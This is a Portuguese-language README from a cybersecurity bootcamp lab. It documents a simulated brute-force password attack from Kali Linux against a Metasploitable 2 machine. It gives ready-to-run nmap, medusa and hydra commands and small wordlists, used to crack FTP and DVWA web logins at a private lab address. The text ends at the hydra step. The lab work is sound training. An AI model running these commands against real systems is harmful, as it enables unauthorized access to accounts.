# README
*Arquivo README do exercicio Simulando um Ataque de Brute Force de Senhas com Medusa e Kali Linux. Referente ao Bootcamp DIO E Santander Cibersegurança 2025.*

Serão mostrados os passos realizados na simulação de um ataque em um ambiente controlado com os sistemas Operacionais Kali Linux e Metaspoitable 2 nos cenários: utilizando servidor FTP, HTTP, DVWA e SMB.

## Simulando um ataque de Brute Force no servidor de FTP.

### 1. Escaneamento da porta 21 do servidor de FTP com nmap no Kali
Realizando o comando para encontrar porta aberta no alvo: 

    nmap -sV -p 21 192.168.217.3 <ip do alvo>
![](/images/01%20nmap%20porta%2021.PNG)

Conforme o print, foi encontrada a porta 21, utilizando o protocolo TCP em estado aberto utilizando o serviço FTP utilizando a versão vsftp 2.3.4.

### 2. Teste de conexão com o servidor FTP alvo.
Realizando o comando para iniciar uma conexão ao servidor FTP: 

    ftp 192.168.217.3 <ip do alvo>
![](/images/02%20conexao%20ftp%20ao%20alvo.PNG)

Conexão realizada servidor FTP com sucesso.

### 3. Criação dos arquivos de Wordlists users.txt e pass.txt
Realizado o comando para criação dos arquivos txt que serão as Wordlist carregadas para a simulação de ataque: 

### Criando o arquivo users.txt no diretório /home do usuário
    echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
![](/images/03%20criacao%20do%20arquivo%20users.PNG)

### Criando o arquivo pass.txt no diretório /home do usuário
    echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
![](/images/04%20criacao%20do%20arquivo%20de%20senhas.PNG)

### 4. Utilizando o medusa para realizar ataque ao alvo
Realizado o comando para iniciar um ataque de força bruta contra o alvo, utilizando as wordlists criadas anteriormente: 

    medusa -h 192.168.217.3 -U users.txt -P pass.txt -M ftp -t 6
![](/images/06%20saida%20do%20comando%20medusa%20encontrando%20combinacao.PNG)
Encontrado um usuario e senha com sucesso no alvo.

### 5. Utilizando o usuario e senha encontrado na tentativa de login no servidço FTP
Realizando o comando para iniciar uma conexão ao servidor FTP utilizando a credencial encontrada: 

    ftp 192.168.217.3
![](/images/07%20teste%20no%20ftp%20com%20login%20encontrado.PNG)

## Simulando um ataque de Brute Force no servidor HTTP DVWA.

### 1. Acessando o servidor HTTP pelo navegador

    http://192.168.217.3/dvwa/login.php
![](/images/08%20acessando%20servidor%20web%20com%20banco%20dvwa.PNG)


Acesso com qualquer credencial para verificar em modo de desenvolvedor no navegador,  a aba Network, escolher o Método POST, verificar a aba Request. será mostado login e senha digitado na página.

![](/images/09%20vendo%20a%20requisicao%20feita%20ao%20servidor%20web.PNG)

### 2. Simulando ataque ao alvo HTTP utilizando o Hydra

    hydra -L users.txt -P pass.txt 192.168.217.3 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed" -vV -t8 -f
